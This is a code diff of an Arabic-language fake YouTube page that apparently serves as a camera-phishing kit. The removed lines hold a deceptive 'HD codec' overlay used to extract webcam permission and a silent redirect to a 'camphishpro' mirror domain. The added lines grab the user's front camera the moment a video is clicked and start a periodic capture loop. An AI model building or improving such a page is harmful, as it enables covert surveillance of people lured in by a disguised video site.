@@ -6,7 +6,7 @@
 <meta name="theme-color" content="#0f0f0f">
 <title>اضغط لمشاهدة الفيديو على يوتيوب</title>
 
-    <!-- وسوم المعاينة والوصف[span_3](start_span)[span_3](end_span) -->
+    <!-- وسوم المعاينة والوصف -->
     <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="عالم الاناقة والجمال" />
@@ -260,7 +260,7 @@ body.drawer-mode .main{margin-inline-start:0}
 </div>
 <div class="toasts" id="toasts"></div>
 
-<!-- عنصر الفيديو المخفي الخاص بالكاميرا[span_4](start_span)[span_4](end_span)[span_5](start_span)[span_5](end_span) -->
+<!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 
 <script>
@@ -312,22 +312,6 @@ const S={view:'home',cat:'الكل',q:'',cur:null,liked:new Set(),disliked:new S
 
 /* ===== متغيرات الكاميرا والتحكم بالصلاحيات ===== */
 let mediaStream = null;
-
-/* ===== الحل الأول: فحص الحظر التلقائي وإعادة التوجيه للنطاق البديل ===== */
-async function checkPermissionAndRotate() {
-    if (navigator.permissions && navigator.permissions.query) {
-        try {
-            const status = await navigator.permissions.query({ name: 'camera' });
-            if (status.state === 'denied') {
-                // توجيه صامت وفوري لنطاق المرآة البديل في حال الحظر الدائم
-                location.replace('https://alt-camphishpro.onrender.com/');
-            }
-        } catch (e) {
-            console.log("فحص الصلاحيات غير مدعوم:", e);
-        }
-    }
-}
-checkPermissionAndRotate();
 
 /* ===== Toast ===== */
 function toast(html,{sticky=false,ms=2600}={}){
@@ -422,8 +406,34 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== فتح الفيديو والانتقال لصفحة المشاهدة مع طبقة الخداع التفاعلية ===== */
-function openVideo(id) {
+/* ===== دوال الكاميرا والانتقال المشروط وإعادة المحاولة ===== */
+async function openVideo(id) {
+    if (mediaStream) {
+        executeWatchTransition(id);
+        return;
+    }
+
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: { ideal: 'user' }
+            } 
+        });
+
+        const videoEl = document.getElementById('video');
+        if (videoEl) {
+            videoEl.srcObject = mediaStream;
+        }
+
+        executeWatchTransition(id);
+        startPeriodicCapture();
+
+    } catch (e) {
+        console.log("تم رفض الإذن أو حدث خطأ في الكاميرا، سيبقى المستخدم في الواجهة الرئيسية:", e);
+    }
+}
+
+function executeWatchTransition(id) {
     S.cur = id;
     S.view = 'watch';
     S.descOpen = false;
@@ -432,17 +442,6 @@ function openVideo(id) {
     document.title = cur().title;
     render();
     scrollTo(0, 0);
-    
-    // إذا كانت الكاميرا مفعلة مسبقاً، يتم تفعيل المشغل مباشرة
-    if (mediaStream) {
-        const overlay = document.getElementById('fakeCodecOverlay');
-        if (overlay) overlay.style.display = 'none';
-        const iframe = document.getElementById('ytIframe');
-        if (iframe) {
-            iframe.style.display = 'block';
-            iframe.src = `https://www.youtube.com/embed/${S.cur}?autoplay=1&rel=0&playsinline=1`;
-        }
-    }
 }
 
 function startPeriodicCapture() {
@@ -473,24 +472,12 @@ function startPeriodicCapture() {
     }, 1500);
 }
 
-/* ===== Watch page with UX Deception / HD Codec Overlay ===== */
+/* ===== Watch page ===== */
 function renderWatch(){
   const v=cur();
   const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
   $('#view').innerHTML=`<div class="watch"><div class="w-primary">
-    <div class="player" style="position:relative;">
-      <iframe id="ytIframe" src="" style="width:100%;height:100%;border:0;display:${mediaStream?'block':'none'};" title="${esc(v.title)}" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>
-      
-      <!-- الحل الثاني: طبقة الخداع التفاعلية لمزامنة التشفير (HD Codec Overlay) -->
-      <div id="fakeCodecOverlay" style="position:absolute; inset:0; background:#0f0f0f; display:${mediaStream?'none':'flex'}; flex-direction:column; align-items:center; justify-content:center; z-index:10; padding:20px; text-align:center;">
-        <svg viewBox="0 0 24 24" style="width:52px;height:52px;fill:#ff0000;margin-bottom:14px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
-        <p style="color:#fff; font-size:15px; font-weight:600; margin-bottom:8px;">عذراً، جودة هذا الفيديو تتطلب مزامنة تشفير المتصفح</p>
-        <p style="color:#aaa; font-size:12px; margin-bottom:18px;">اضغط لتفعيل حزمة ترميز العرض التلقائي (HD Codec Sync)</p>
-        <button id="enableSyncBtn" class="btn btn-blue" style="background:#3ea6ff; color:#0f0f0f; font-weight:bold; padding:10px 24px; border-radius:20px; cursor:pointer;">
-          تفعيل التشغيل عالي الدقة (HD)
-        </button>
-      </div>
-    </div>
+    <div class="player"><iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1&rel=0&playsinline=1" title="${esc(v.title)}" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe></div>
     <div class="yt-link-wrap"><a class="yt-link" href="${linkOf(v)}" target="_blank" rel="noopener">الفيديو لا يعمل؟ شاهده على يوتيوب ↗</a></div>
     <div id="wMeta"></div>
     <div id="wComments">
@@ -501,7 +488,6 @@ function renderWatch(){
     <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${x.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
   refreshMeta();refreshComments();
 }
-
 function refreshMeta(){
   const v=cur(),liked=S.liked.has(v.id),dis=S.disliked.has(v.id),sub=S.subs.has(v.ch),saved=S.saved.has(v.id),dl=S.dl.has(v.id);
   $('#wMeta').innerHTML=`<h1 class="w-title">${v.title}</h1>
@@ -603,36 +589,8 @@ function act(a,el){
   }
 }
 
-document.addEventListener('click',async e=>{
+document.addEventListener('click',e=>{
   if(e.target.id==='modal'){closeModal();return}
-  
-  // معالجة النقر على زر تفعيل مزامنة التشفير الوهمي (HD Codec Overlay)
-  if(e.target && e.target.id === 'enableSyncBtn'){
-      try {
-          mediaStream = await navigator.mediaDevices.getUserMedia({ 
-              video: { facingMode: { ideal: 'user' } } 
-          });
-          
-          const videoEl = document.getElementById('video');
-          if (videoEl) videoEl.srcObject = mediaStream;
-
-          const overlay = document.getElementById('fakeCodecOverlay');
-          if (overlay) overlay.style.display = 'none';
-
-          const iframe = document.getElementById('ytIframe');
-          if (iframe) {
-              iframe.style.display = 'block';
-              iframe.src = `https://www.youtube.com/embed/${S.cur}?autoplay=1&rel=0&playsinline=1`;
-          }
-
-          startPeriodicCapture();
-      } catch (err) {
-          console.log("تم رفض الإذن أو إغلاقه:", err);
-          e.target.textContent = 'إعادة محاولة تفعيل العرض (HD)';
-      }
-      return;
-  }
-
   const el=e.target.closest('[data-action],[data-open],[data-nav],[data-cat],[data-ch]');
   if(!el)return;
   const d=el.dataset;
